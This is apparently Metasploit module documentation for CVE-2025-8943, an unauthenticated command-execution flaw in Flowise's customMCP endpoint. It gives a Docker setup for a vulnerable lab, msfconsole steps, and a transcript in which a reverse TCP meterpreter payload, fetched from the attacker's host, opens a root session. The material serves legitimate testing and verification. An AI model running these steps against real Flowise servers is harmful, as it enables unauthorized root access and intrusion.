## Vulnerable Application

[Flowise](https://github.com/FlowiseAI/Flowise) is an open-source platform for building AI agents. Versions prior to 3.0.1 are vulnerable
to an unauthenticated remote command execution vulnerability (CVE-2025-8943) in the customMCP endpoint.

The vulnerability exists in the `/api/v1/node-load-method/customMCP` endpoint which allows unauthenticated users to execute arbitrary
commands by sending a specially crafted JSON payload. The endpoint accepts a command and arguments that are executed directly on the system.

This vulnerability affects Flowise versions < 3.0.1.

This module was successfully tested on:

    * Flowise 3.0.0 installed with Docker

### Installation

1. Create a directory and create `docker-compose.yml` with the following content:

```yaml
services:
    flowise:
        image: flowiseai/flowise:3.0.0
        restart: always
        environment:
            - PORT=3000
            - DATABASE_PATH=/root/.flowise
            - APIKEY_PATH=/root/.flowise
            - SECRETKEY_PATH=/root/.flowise
            - LOG_PATH=/root/.flowise/logs
            - BLOB_STORAGE_PATH=/root/.flowise/storage
        ports:
            - '3000:3000'
        healthcheck:
            test: ['CMD', 'curl', '-f', 'http://localhost:3000/api/v1/ping']
            interval: 10s
            timeout: 5s
            retries: 5
            start_period: 30s
        volumes:
            - ~/.flowise:/root/.flowise
        entrypoint: /bin/sh -c "sleep 3; flowise start"
```

2. `docker compose up -d`

3. Verify the installation by checking http://127.0.0.1:3000/api/v1/version (should return `{"version":"3.0.0"}`)


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/multi/http/flowise_custommcp_rce`
4. Do: `set RHOSTS <target_ip>`
5. Do: `set LHOST <your_ip>`
6. Do: `set FETCH_SRVHOST <your_ip>`
7. Do: `run`
8. You should get a meterpreter session


## Options


## Scenarios

### Flowise 3.0.0 on Linux (Docker)

```
msf6 > use exploit/multi/http/flowise_custommcp_rce
[*] No payload configured, defaulting to cmd/linux/http/aarch64/meterpreter/reverse_tcp
msf6 exploit(multi/http/flowise_custommcp_rce) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/flowise_custommcp_rce) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/flowise_custommcp_rce) > set PAYLOAD cmd/linux/http/x64/meterpreter_reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter_reverse_tcp
msf6 exploit(multi/http/flowise_custommcp_rce) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(multi/http/flowise_custommcp_rce) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/http/flowise_custommcp_rce) > set FETCH_SRVHOST 172.17.0.1
FETCH_SRVHOST => 172.17.0.1
msf6 exploit(multi/http/flowise_custommcp_rce) > set FETCH_SRVPORT 8081
FETCH_SRVPORT => 8081
msf6 exploit(multi/http/flowise_custommcp_rce) > run

[*] Started reverse TCP handler on 172.17.0.1:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Flowise version detected: 3.0.0
[+] The target appears to be vulnerable. Version 3.0.0 is vulnerable to CVE-2025-8943
[*] Sending stage (3090404 bytes) to 172.23.0.2
[*] Meterpreter session 1 opened (172.17.0.1:5555 -> 172.23.0.2:36184) at 2025-11-18 21:45:37 +0100

meterpreter > sysinfo
Computer        : docker-flowise-1
OS              : Linux
Architecture    : x64
System Language : en_US.UTF-8
Meterpreter     : x64/linux
meterpreter > getuid
Server username: root 
```

